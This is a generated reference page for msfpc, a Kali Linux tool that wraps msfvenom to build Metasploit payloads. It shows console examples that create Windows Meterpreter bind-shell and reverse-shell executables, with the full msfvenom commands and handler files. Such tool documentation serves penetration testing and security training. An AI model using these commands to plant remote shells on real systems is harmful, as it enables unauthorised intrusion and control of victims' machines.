---
tool_id: msfpc
title: msfpc
categories: ["exploitation-tools", "post-exploitation"]
category_slugs: ["exploitation-tools", "post-exploitation"]
homepage: https://github.com/g0tmi1k/msfpc
repository: 
version: 1.4.5-0kali3
architectures: any
license: 
binaries: []
metapackages: ["kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-linux-nethunter kali-tools-exploitation kali-tools-social-engineering"]
icon: images/msfpc-logo.svg
source_path: kali-tools\msfpc\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.994670
---

# Tool: msfpc (msfpc)

## Categories
- [exploitation-tools](../exploitation-tools.md)
- [post-exploitation](../post-exploitation.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/g0tmi1k/msfpc](https://github.com/g0tmi1k/msfpc) |
| Repository |  |
| Version | 1.4.5-0kali3 |
| Architectures | any |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-linux-nethunter kali-tools-exploitation kali-tools-social-engineering |
| Icon | images/msfpc-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/msfpc
- **PackagesInfo**: |
- ****Installed size**: ** `58 KB`
- ****How to install**: ** `sudo apt install msfpc`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# msfpc -h
- **Example**: /usr/bin/msfpc windows 192.168.1.10        # Windows & manual IP.
- **<TYPE>**: []
- **<BATCH> will generate as many combinations as possible**: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT>


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## msfpc Usage Examples

Semi-interactively create a Windows Meterpreter bind shell on port 5555.

```console
root@kali:~# msfpc windows bind 5555 verbose
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

 [i] Use which interface - IP address?:
 [i]   1.) lo - 127.0.0.1
 [i]   2.) eth0 - 172.16.193.160
 [i]   3.) wan - 68.151.240.61
 [?] Select 1-3, interface or IP address: 2

 [i]        IP: 172.16.193.160
 [i]      PORT: 5555
 [i]      TYPE: windows (windows/meterpreter/bind_tcp)
 [i]     SHELL: meterpreter
 [i] DIRECTION: bind
 [i]     STAGE: staged
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p windows/meterpreter/bind_tcp -f exe \
  --platform windows -a x86 -e generic/none  LPORT=5555 \
  > '/root/windows-meterpreter-staged-bind-tcp-5555.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-bind-tcp-5555.exe'

 [i] File: PE32 executable (GUI) Intel 80386, for MS Windows
 [i] Size: 76K
 [i]  MD5: 5bdb434e053fa0a9894eb88720c09e2a
 [i] SHA1: 9d51c45c76dfd947994cb4be61f5f9797b35167f

 [i] MSF handler file: '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
 ```


Automatically generate a Windows reverse Meterpreter payload, using the IP address of the eth0 interface as the LHOST parameter.

```console
root@kali:~# msfpc windows eth0
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]   IP: 172.16.193.160
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=172.16.193.160 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
```


## Source
- Path: kali-tools\msfpc\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.994670
